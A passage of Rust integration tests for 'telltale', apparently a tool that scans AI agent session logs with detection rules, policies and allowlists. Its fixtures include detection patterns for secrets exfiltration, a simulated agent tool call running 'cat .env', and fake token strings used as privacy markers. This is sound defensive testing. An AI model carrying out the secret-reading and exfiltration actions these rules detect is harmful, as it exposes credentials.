        "stderr: {}",
        String::from_utf8_lossy(&unnamed.stderr)
    );
    let unnamed_summary: Value = serde_json::from_slice(&unnamed.stdout).expect("summary json");
    assert!(unnamed_summary["policy"].is_null());
    assert_eq!(
        unnamed_summary["detection_flow"]["policy_match_accounting"]["status"],
        "available"
    );
    assert_eq!(
        unnamed_summary["detection_flow"]["policy_match_accounting"]["pre_policy_detection_candidate_count"],
        1
    );
    assert_eq!(
        unnamed_summary["detection_flow"]["policy_match_accounting"]["fully_filtered_detection_candidate_count"],
        1
    );
    assert_eq!(
        unnamed_summary["detection_flow"]["policy_match_accounting"]["filtered_rule_id_count"],
        1
    );

    let blank_policy = temp.path().join("blank-policy.yaml");
    fs::write(
        &blank_policy,
        "name: \"   \"\ndisabled_categories:\n  - custom_agent_behavior\n",
    )
    .expect("write blank policy");
    let log_path = temp.path().join("blank-policy-events.jsonl");
    let blank = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--backfill",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args([
            "--no-default-rules",
            "--rules",
            "tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml",
            "--policy",
        ])
        .arg(&blank_policy)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run blank-policy scan");
    assert!(
        blank.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&blank.stderr)
    );
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).expect("schema");
    let validator = validator_for(&schema).expect("schema validator");
    let events = fs::read_to_string(&log_path)
        .expect("blank-policy event log")
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    let health = events
        .iter()
        .find(|event| event["event_type"] == "health")
        .expect("health event");
    assert!(health.get("active_policy_name").is_none());
    for event in &events {
        assert!(
            validator.is_valid(event),
            "native event failed schema: {event}"
        );
    }
}

#[test]
fn policy_filtered_invalid_rules_only_degrade_diagnostics() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("diagnostic.jsonl"),
        include_str!("../../tests/fixtures/custom_rules/custom-agent-behavior.jsonl"),
    )
    .expect("diagnostic fixture");

    // Rule v2 rejects an invalid regex or metadata value when the document is
    // read, policy or not; a rule the canonical compiler rejects still loads.
    {
        let (case, invalid_rule, sentinel) = (
            "canonical",
            "title: invalid canonical fixture\nid: 2b8c4d6e-0f1a-4b3c-8d5e-6f7a8b9c0d1e\nname: test.invalid.canonical\n\
         taxonomy: telltale\nlogsource:\n    product: ai_agent\n    category: message\n\
         detection:\n    selection:\n        - message.assistant_text|re: 'DIAGNOSTIC_CANONICAL_SENTINEL'\n\
         \x20   condition: selection\nlevel: medium\ntelltale:\n    category: test\n    score: 1\n\
         \x20   explanation: invalid canonical fixture\n    detection_class: operational_health\n",
            "DIAGNOSTIC_CANONICAL_SENTINEL",
        );
        let rules_path = temp.path().join(format!("invalid-{case}.yaml"));
        let invalid_id = format!("test.invalid.{case}");
        fs::write(
            &rules_path,
            format!(
                "title: valid fixture\nid: 7c9e1f3a-5b2d-4e6f-8a0b-1c2d3e4f5a6b\nname: test.valid\ntaxonomy: telltale\n\
                 logsource:\n    product: ai_agent\n    category: message\ndetection:\n    selection:\n\
                 \x20       - message.assistant_text|re: 'exfiltrate project secrets'\n    condition: selection\n\
                 level: medium\ntelltale:\n    category: test\n    score: 1\n    explanation: valid fixture\n\
                 ---\n{invalid_rule}"
            ),
        )
        .expect("invalid rules fixture");
        let policy_path = temp.path().join(format!("invalid-{case}-policy.yaml"));
        fs::write(
            &policy_path,
            format!("name: diagnostic-policy\ndisabled_rules: [{invalid_id}]\n"),
        )
        .expect("invalid policy fixture");
        let log_path = temp.path().join(format!("invalid-{case}.jsonl"));
        let state_path = temp.path().join(format!("invalid-{case}-state.json"));

        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--root",
            ])
            .arg(&root)
            .args(["--client", "codex", "--no-default-rules", "--rules"])
            .arg(&rules_path)
            .args(["--policy"])
            .arg(&policy_path)
            .args(["--log-path"])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run invalid diagnostic scan");
        assert_diagnostic_only_scan(&output, &log_path, sentinel, 1);
    }
}

#[test]
/// Chain scores that would overflow pre-policy risk accounting no longer load:
/// Rule v2 bounds every score at 100, policy or not, so a scan fails before it
/// activates any output.
fn pre_policy_overflow_scores_fail_before_scan_outputs_activate() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("overflow.jsonl"),
        include_str!("../../tests/fixtures/custom_rules/custom-agent-behavior.jsonl")
            .replace("exfiltrate project secrets", "overflow diagnostic match"),
    )
    .expect("overflow fixture");
    let rules_path = temp.path().join("overflow.yaml");
    fs::write(
        &rules_path,
        r#"title: first overflow fixture
id: 67870354-fc7a-4ffe-8b2d-1512ce13617a
name: test.overflow.first
taxonomy: telltale
logsource:
    product: ai_agent
    category: message
detection:
    selection:
        - message.assistant_text|re: 'overflow diagnostic match'
    condition: selection
level: medium
telltale:
    category: test
    score: 0
    explanation: 'first overflow fixture'
---
title: second overflow fixture
id: 4a10d07a-52fd-4570-806a-22e43fddad34
name: test.overflow.second
taxonomy: telltale
logsource:
    product: ai_agent
    category: message
detection:
    selection:
        - message.assistant_text|re: 'overflow diagnostic match'
    condition: selection
level: medium
telltale:
    category: test
    score: 0
    explanation: 'second overflow fixture'
---
title: first compatibility contribution
id: 13f30fa9-3c45-49d4-88ff-43b4769be938
name: test.overflow.first.modifier
taxonomy: telltale
correlation:
    type: telltale_chain
    rules: [test.overflow.first]
telltale:
    score: 18446744073709551615
    explanation: 'first compatibility contribution'
---
title: second compatibility contribution
id: 788f72d5-8ff5-4157-811b-493dbc596a8f
name: test.overflow.second.modifier
taxonomy: telltale
correlation:
    type: telltale_chain
    rules: [test.overflow.second]
telltale:
    score: 18446744073709551615
    explanation: 'second compatibility contribution'
"#,
    )
    .expect("overflow rules fixture");
    let policy_path = temp.path().join("overflow-policy.yaml");
    fs::write(
        &policy_path,
        "name: overflow-policy\ndisabled_rules: [test.overflow.second]\n",
    )
    .expect("overflow policy fixture");
    let log_path = temp.path().join("overflow.jsonl");
    let state_path = temp.path().join("overflow-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--client", "codex", "--no-default-rules", "--rules"])
        .arg(&rules_path)
        .args(["--policy"])
        .arg(&policy_path)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run overflow diagnostic scan");
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains(
            "chain 'test.overflow.first.modifier': telltale.score must be between 0 and 100"
        ),
        "{stderr}"
    );
    assert!(!stderr.contains("overflow diagnostic match"), "{stderr}");
    assert!(!log_path.exists() && !state_path.exists());
}

#[test]
fn partial_policy_repeated_state_preserves_events_and_accounting() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("partial.jsonl"),
        include_str!("../../tests/fixtures/custom_rules/custom-agent-behavior.jsonl"),
    )
    .expect("partial fixture");
    let rules_path = temp.path().join("partial.yaml");
    fs::write(
        &rules_path,
        r#"title: first partial fixture
id: dbcb6cfc-54e7-4095-855f-b6cb20d81361
name: test.partial.first
taxonomy: telltale
logsource:
    product: ai_agent
    category: message
detection:
    selection:
        - message.assistant_text|re: 'exfiltrate project secrets'
    condition: selection
level: medium
telltale:
    category: test
    score: 1
    explanation: 'first partial fixture'
---
title: second partial fixture
id: 1d020aeb-8c14-498f-8629-85f5d2caa25e
name: test.partial.second
taxonomy: telltale
logsource:
    product: ai_agent
    category: message
detection:
    selection:
        - message.assistant_text|re: 'exfiltrate project secrets'
    condition: selection
level: medium
telltale:
    category: test
    score: 1
    explanation: 'second partial fixture'
"#,
    )
    .expect("partial rules fixture");
    let policy_path = temp.path().join("partial-policy.yaml");
    fs::write(
        &policy_path,
        "name: partial-policy\ndisabled_rules: [test.partial.second]\n",
    )
    .expect("partial policy fixture");
    let log_path = temp.path().join("partial.jsonl");
    let state_path = temp.path().join("partial-state.json");

    let run = || {
        Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--root",
            ])
            .arg(&root)
            .args(["--client", "codex", "--no-default-rules", "--rules"])
            .arg(&rules_path)
            .args(["--policy"])
            .arg(&policy_path)
            .args(["--log-path"])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run partial policy scan")
    };
    let first = run();
    assert!(
        first.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&first.stderr)
    );
    let first_summary: Value = serde_json::from_slice(&first.stdout).expect("first summary");
    let first_log = fs::read_to_string(&log_path).expect("partial event log");
    assert_eq!(first_log.lines().count(), 2);
    let second = run();
    assert!(
        second.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&second.stderr)
    );
    let second_summary: Value = serde_json::from_slice(&second.stdout).expect("second summary");
    for summary in [&first_summary, &second_summary] {
        assert_eq!(summary["detection_count"], 1);
        assert_eq!(
            summary["detection_flow"]["policy_match_accounting"]["status"],
            "available"
        );
        assert_eq!(
            summary["detection_flow"]["policy_match_accounting"]["pre_policy_detection_candidate_count"],
            1
        );
        assert_eq!(
            summary["detection_flow"]["policy_match_accounting"]["fully_filtered_detection_candidate_count"],
            0
        );
        assert_eq!(
            summary["detection_flow"]["policy_match_accounting"]["filtered_rule_id_count"],
            1
        );
    }
    assert_eq!(
        first_summary["detection_flow"]["emitted_detection_count"],
        1
    );
    assert_eq!(
        first_summary["detection_flow"]["state_deduplicated_detection_count"],
        0
    );
    assert_eq!(
        second_summary["detection_flow"]["emitted_detection_count"],
        0
    );
    assert_eq!(
        second_summary["detection_flow"]["state_deduplicated_detection_count"],
        1
    );
    let second_log = fs::read_to_string(&log_path).expect("partial event log after repeat");
    assert_eq!(second_log, first_log);
}

#[test]
fn scan_discovers_local_policy_when_explicit_policy_is_absent() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let state_path = temp.path().join("scan-state.json");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("custom-agent-behavior.jsonl"),
        include_str!("../../tests/fixtures/custom_rules/custom-agent-behavior.jsonl"),
    )
    .expect("custom behavior fixture");

    let config_root = temp.path().join("config");
    fs::create_dir_all(config_root.join("rules.d")).expect("rules dir");
    fs::create_dir_all(config_root.join("policies.d")).expect("policies dir");
    fs::create_dir_all(config_root.join("allowlists.d")).expect("allowlists dir");
    fs::write(
        config_root.join("rules.d/custom-agent-behavior.yaml"),
        include_str!("../../tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml"),
    )
    .expect("write local rule");
    fs::write(
        config_root.join("policies.d/disable-custom-category.yml"),
        include_str!("../../tests/fixtures/custom_rules/disable-custom-category.yaml"),
    )
    .expect("write local policy");
    fs::write(
        config_root.join("allowlists.d/known-benign.yaml"),
        "version: 1\nsuppressions: []\n",
    )
    .expect("write local allowlist");
    let discovered_policy_path = discovered_config_file(
        &config_root.join("policies.d"),
        "disable-custom-category.yml",
    );
    let discovered_allowlist_path =
        discovered_config_file(&config_root.join("allowlists.d"), "known-benign.yaml");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--dry-run", "--root"])
        .arg(&root)
        .args(["--no-default-rules", "--config-dir"])
        .arg(&config_root)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale scan");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["detection_count"], 0);
    assert_eq!(summary["rule_count"], 0);
    assert_eq!(
        summary["policy"],
        format!("[policy:{}]", evidence_hash("no-custom-agent-behavior"))
    );
    assert_eq!(
        summary["effective_configuration"]["policy"]["origin"],
        "local_config"
    );
    assert_eq!(
        summary["effective_configuration"]["policy"]["path_hash"],
        path_hash(&discovered_policy_path)
    );
    assert_eq!(
        summary["effective_configuration"]["allowlist"]["origin"],
        "local_config"
    );
    assert_eq!(
        summary["effective_configuration"]["allowlist"]["path_hash"],
        path_hash(&discovered_allowlist_path)
    );
}

#[test]
fn scan_explicit_policy_wins_over_discovered_policy_ambiguity() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let state_path = temp.path().join("scan-state.json");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("custom-agent-behavior.jsonl"),
        include_str!("../../tests/fixtures/custom_rules/custom-agent-behavior.jsonl"),
    )
    .expect("custom behavior fixture");

    let config_root = temp.path().join("config");
    fs::create_dir_all(config_root.join("rules.d")).expect("rules dir");
    fs::create_dir_all(config_root.join("policies.d")).expect("policies dir");
    fs::write(
        config_root.join("rules.d/custom-agent-behavior.yaml"),
        include_str!("../../tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml"),
    )
    .expect("write local rule");
    fs::write(
        config_root.join("policies.d/one.yaml"),
        "name: local-one\ndisabled_categories: [network]\n",
    )
    .expect("write first local policy");
    fs::write(
        config_root.join("policies.d/two.yml"),
        "name: local-two\ndisabled_categories: [secret_access]\n",
    )
    .expect("write second local policy");
    let explicit_policy = temp.path().join("explicit-policy.yaml");
    fs::write(
        &explicit_policy,
        include_str!("../../tests/fixtures/custom_rules/disable-custom-category.yaml"),
    )
    .expect("write explicit policy");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--dry-run", "--root"])
        .arg(&root)
        .args(["--no-default-rules", "--config-dir"])
        .arg(&config_root)
        .args(["--policy"])
        .arg(&explicit_policy)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale scan");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["detection_count"], 0);
    assert_eq!(
        summary["policy"],
        format!("[policy:{}]", evidence_hash("no-custom-agent-behavior"))
    );
    assert_eq!(
        summary["effective_configuration"]["policy"]["origin"],
        "cli"
    );
    assert_eq!(
        summary["effective_configuration"]["policy"]["path_hash"],
        path_hash(&explicit_policy)
    );
}

#[test]
fn scan_allowlist_marks_matching_detections_suppressed() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("custom-agent-behavior.jsonl"),
        include_str!("../../tests/fixtures/custom_rules/custom-agent-behavior.jsonl"),
    )
    .expect("custom behavior fixture");
    let allowlist_path = temp.path().join("allowlists.yaml");
    fs::write(
        &allowlist_path,
        r#"
version: 1
suppressions:
  - name: fixture-custom-agent
    clients: ["codex"]
    session_ids: ["custom-agent-behavior"]
    rule_ids: ["custom.agent.malicious_behavior"]
"#,
    )
    .expect("allowlist fixture");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args([
            "--rules",
            "tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml",
            "--allowlist",
        ])
        .arg(&allowlist_path)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale scan");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["detection_count"], 1);
    assert_eq!(summary["suppressed_count"], 1);
    assert_eq!(
        summary["effective_configuration"]["allowlist"]["origin"],
        "cli"
    );
    assert_eq!(
        summary["effective_configuration"]["allowlist"]["path_hash"],
        path_hash(&allowlist_path)
    );
    assert_eq!(
        summary["detection_flow"]["effective_detection_candidate_count"],
        1
    );
    assert_eq!(
        summary["detection_flow"]["allowlist_marked_detection_count"],
        1
    );
    assert_eq!(
        summary["detection_flow"]["state_deduplicated_detection_count"],
        0
    );
    assert_eq!(summary["detection_flow"]["emitted_detection_count"], 1);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    let detection = events
        .iter()
        .find(|event| event["event_type"] == "detection")
        .expect("suppressed detection");
    assert_eq!(detection["severity"], "informational");
    assert_eq!(detection["risk_score"], 0);
    assert!(
        detection["tags"]
            .as_array()
            .expect("tags")
            .iter()
            .any(|tag| tag == "suppressed")
    );
    assert!(
        detection["tags"]
            .as_array()
            .expect("tags")
            .iter()
            .any(|tag| tag
                == &format!(
                    "allowlist:[suppression:{}]",
                    evidence_hash("fixture-custom-agent")
                ))
    );
    assert!(detection.get("triage").is_none());
    assert!(detection.get("response").is_none());
}

#[test]
fn scan_discovers_local_allowlist_when_explicit_allowlist_is_absent() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("custom-agent-behavior.jsonl"),
        include_str!("../../tests/fixtures/custom_rules/custom-agent-behavior.jsonl"),
    )
    .expect("custom behavior fixture");
    let config_root = temp.path().join("config");
    fs::create_dir_all(config_root.join("rules.d")).expect("rules dir");
    fs::create_dir_all(config_root.join("allowlists.d")).expect("allowlists dir");
    fs::write(
        config_root.join("rules.d/custom-agent-behavior.yaml"),
        include_str!("../../tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml"),
    )
    .expect("write local rule");
    fs::write(
        config_root.join("allowlists.d/custom-agent.yml"),
        r#"
version: 1
suppressions:
  - name: fixture-custom-agent
    clients: ["codex"]
    session_ids: ["custom-agent-behavior"]
    rule_ids: ["custom.agent.malicious_behavior"]
"#,
    )
    .expect("write local allowlist");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--allow-fixtures", "--root"])
        .arg(&root)
        .args(["--no-default-rules", "--config-dir"])
        .arg(&config_root)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale scan");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["detection_count"], 1);
    assert_eq!(summary["suppressed_count"], 1);

    let lines = fs::read_to_string(log_path).expect("log file");
    let detection = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .find(|event| event["event_type"] == "detection")
        .expect("suppressed detection");
    assert_eq!(detection["severity"], "informational");
    assert!(
        detection["tags"]
            .as_array()
            .expect("tags")
            .iter()
            .any(|tag| tag
                == &format!(
                    "allowlist:[suppression:{}]",
                    evidence_hash("fixture-custom-agent")
                ))
    );
}

#[test]
fn rules_coverage_reports_fixture_and_client_coverage() {
    // Core rules need local fixtures; community rules carry their scenario
    // evidence in the community repository instead.
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "rules",
            "coverage",
            "--no-local-config",
            "--no-community-rules",
        ])
        .output()
        .expect("run telltale rules coverage");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("RULE COVERAGE REPORT"));
    assert!(stdout.contains("mcp.tool_metadata.prompt_injection"));
    assert!(stdout.contains("secret.env.read"));
    assert!(!stdout.contains("COVERAGE GAPS"));
    // Verify columns are present.
    assert!(stdout.contains("POSITIVE"));
    assert!(stdout.contains("CLIENTS"));
    assert!(stdout.contains("FALSE_POSITIVES"));
    assert!(stdout.contains("chain.secret_then_network"));
    assert!(stdout.contains("secret_access+exfiltration"));
    assert!(stdout.contains("Authorized backup or migration work may read secret files"));
}

#[test]
fn rules_coverage_uses_ordered_managed_pack() {
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "rules",
            "coverage",
            "--no-default-rules",
            "--config-dir",
            "tests/fixtures/rule_packs/ordered",
            "--root",
            "tests/fixtures/session_stores",
        ])
        .output()
        .expect("run ordered rules coverage");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("pack.organization"));
    assert!(stdout.contains("pack.deployment"));
    assert!(stdout.contains("pack.local"));
}

#[test]
fn rules_coverage_fails_nonzero_on_invalid_accounting() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("codex/sessions/2026/04");
    fs::create_dir_all(&root).expect("create fixture root");
    fs::write(
        root.join("overflow.jsonl"),
        "{\"type\":\"event_msg\",\"session_id\":\"overflow-session\",\"timestamp\":\"2026-05-08T10:00:01Z\",\"payload\":{\"type\":\"assistant_message\",\"message\":\"trigger\"}}\n",
    )
    .expect("write fixture");
    let rules = temp.path().join("overflow.yaml");
    fs::write(
        &rules,
        r#"title: first overflow contribution
id: 48dcb2dd-d88d-4efb-8c4b-e637b39c0996
name: rule.one
taxonomy: telltale
logsource:
    product: ai_agent
    category: message
detection:
    selection:
        - message.assistant_text|re: 'trigger'
    condition: selection
level: high
telltale:
    category: test
    score: 1
    explanation: 'first overflow contribution'
---
title: second overflow contribution
id: 27a90c79-52fc-4ad4-8995-258dee056fe6
name: rule.two
taxonomy: telltale
logsource:
    product: ai_agent
    category: message
detection:
    selection:
        - message.assistant_text|re: 'trigger'
    condition: selection
level: high
telltale:
    category: test
    score: 1
    explanation: 'second overflow contribution'
"#,
    )
    .expect("write overflow rules");
    // Rule v2 bounds a document score at 100; an override can still set a
    // score the canonical compiler rejects.
    let config = temp.path().join("config");
    fs::create_dir_all(config.join("overrides.d")).expect("overrides dir");
    fs::write(
        config.join("overrides.d/overflow.yaml"),
        "version: 1\noverrides:\n  - rule_id: rule.one\n    score: 18446744073709551615\n    reason: synthetic\n  - rule_id: rule.two\n    score: 18446744073709551615\n    reason: synthetic\n",
    )
    .expect("write overflow overrides");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "coverage", "--no-default-rules", "--config-dir"])
        .arg(&config)
        .arg("--root")
        .arg(temp.path())
        .arg("--rules")
        .arg(&rules)
        .output()
        .expect("run overflow coverage");
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("score_out_of_range"), "{stderr}");
}

#[test]
fn rules_test_fails_nonzero_on_scanner_error() {
    let temp = tempdir().expect("tempdir");
    let fixture = temp.path().join("invalid.jsonl");
    fs::write(&fixture, "not json\n").expect("write invalid fixture");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "test", "--no-local-config"])
        .arg(&fixture)
        .output()
        .expect("run invalid rules test");
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("rules test failed"), "{stderr}");
}

#[test]
fn rules_test_rejects_unsafe_source_sessions_without_leaking() {
    let temp = tempdir().expect("tempdir");
    let fixture = temp.path().join("unsafe-session.jsonl");
    let sessions = [
        "TOKEN=TT_PRIVACY_RULES_TEST_SESSION_ASSIGNMENT_25",
        "ghp_AbCdEfGhIjKlMnOpQrStUvWxYz12",
        "https://user:TT_PRIVACY_RULES_TEST_SESSION_URL_25@session.example.invalid",
    ];
    fs::write(
        &fixture,
        sessions
            .iter()
            .enumerate()
            .map(|(index, session)| format!(
                "{{\"type\":\"event_msg\",\"session_id\":\"{session}\",\"timestamp\":\"2026-05-08T10:00:0{}Z\",\"payload\":{{\"type\":\"tool_call\",\"tool_name\":\"shell\",\"command\":\"cat .env\"}}}}",
                index + 1
            ))
            .collect::<Vec<_>>()
            .join("\n"),
    )
    .expect("write fixture");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "test", "--no-local-config"])
        .arg(&fixture)
        .output()
        .expect("run rules test");
    assert!(
        !output.status.success(),
        "invalid session identity was accepted"
    );
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    for session in sessions {
        assert!(
            !text.contains(session),
            "rules test retained a controlled session marker"
        );
    }
    assert!(text.contains("rules test failed"));
}

#[test]
fn rules_coverage_sanitizes_the_root_path_in_operator_output() {
    let temp = tempdir().expect("tempdir");
    let marker = "TT_PRIVACY_RULES_COVERAGE_ROOT_25";
    let root = temp.path().join(marker);
    fs::create_dir_all(&root).expect("create empty fixture root");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "coverage", "--no-local-config", "--root"])
        .arg(&root)
        .output()
        .expect("run rules coverage");
    assert!(output.status.success(), "rules coverage did not complete");
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(
        !text.contains(marker),
        "rules coverage retained a controlled root marker"
    );
    assert!(text.contains("[sensitive-path]"));
}

fn community_rule_ids() -> Vec<String> {
    let community =
        telltale_rules::package::bundled_community_package().expect("community package");
    let ids = community
        .documents()
        .iter()
        .flat_map(|document| document.definitions())
        .filter(|definition| definition.kind() == telltale_rules::DefinitionKind::Rule)
        .map(|rule| rule.id().to_owned())
        .collect::<Vec<_>>();
    assert!(!ids.is_empty(), "embedded community package has rules");
    ids
}

fn listed_rule_ids(args: &[&str], community_env: Option<&str>) -> Vec<String> {
    let mut command = Command::new(env!("CARGO_BIN_EXE_telltale"));
    command.args(["rules", "list"]).args(args);
    command.env_remove("TELLTALE_COMMUNITY_RULES");
    if let Some(value) = community_env {
        command.env("TELLTALE_COMMUNITY_RULES", value);
    }
    let output = command.output().expect("run telltale rules list");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    String::from_utf8_lossy(&output.stdout)
        .lines()
        .filter_map(|line| line.split('\t').next())
        .filter(|id| !id.is_empty())
        .map(str::to_owned)
        .collect()
}

fn community_package_yaml(version: &str, rule_id: &str) -> String {
    format!(
        r#"format: telltale-rule-package/v2
id: telltale.community
title: Synthetic community release
version: "{version}"
publisher: Synthetic community
license: Apache-2.0
rule_namespace: tdx
---
title: Synthetic community rule
id: 5d0f6c4e-8a1b-4c2d-9e3f-0a1b2c3d4e5f
name: {rule_id}
taxonomy: telltale
logsource:
    product: ai_agent
    category: tool_activity
detection:
    selection:
        - tool.command|re|i: 'synthetic-community-marker'
    condition: selection
level: low
telltale:
    category: persistence
    score: 20
    explanation: Synthetic community rule.
    tags: [synthetic]
"#
    )
}

#[test]
fn community_rules_load_by_default_and_every_opt_out_removes_them() {
    let community = community_rule_ids();
    let default = listed_rule_ids(&["--no-local-config"], None);
    assert_eq!(default.len(), crate::default_rule_count());
    for id in &community {
        assert!(default.contains(id), "default rules omit {id}");
    }
    assert!(default.iter().any(|id| id == "secret.env.read"));

    let temp = tempdir().expect("tempdir");
    let custom = temp.path().join("custom.yaml");
    fs::write(
        &custom,
        r#"title: Synthetic custom rule
id: d640aeee-8eb1-49d1-86e5-ad545315a80f
name: custom.synthetic.marker
taxonomy: telltale
logsource:
    product: ai_agent
    category: tool_activity
detection:
    selection:
        - tool.command|re|i: 'synthetic-custom-marker'
    condition: selection
level: low
telltale:
    category: persistence
    score: 20
    explanation: 'Synthetic custom rule.'
    tags: [synthetic]
"#,
    )
    .expect("custom rules");
    let custom = custom.to_string_lossy().into_owned();
    for (args, env) in [
        (vec!["--no-local-config", "--no-community-rules"], None),
        (vec!["--no-local-config"], Some("0")),
        (vec!["--no-local-config"], Some("FALSE")),
        (vec!["--no-local-config"], Some(" Off ")),
        (vec!["--no-local-config"], Some("No")),
        (
            vec![
                "--no-local-config",
                "--no-default-rules",
                "--rules",
                custom.as_str(),
            ],
            None,
        ),
    ] {
        let listed = listed_rule_ids(&args, env);
        for id in &community {
            assert!(!listed.contains(id), "{args:?} {env:?} still loads {id}");
        }
    }
}

#[test]
fn installed_community_package_replaces_the_embedded_snapshot() {
    let temp = tempdir().expect("tempdir");
    let packages = temp.path().join("rule-packages.d");
    fs::create_dir_all(&packages).expect("package dir");
    fs::write(
        packages.join("community.yaml"),
        community_package_yaml("99.0.0", "tdx.synthetic.newer_release"),
    )
    .expect("package");
    let config_dir = temp.path().to_string_lossy().into_owned();

    let listed = listed_rule_ids(&["--config-dir", &config_dir], None);
    assert!(listed.contains(&"tdx.synthetic.newer_release".to_string()));
    for id in community_rule_ids() {
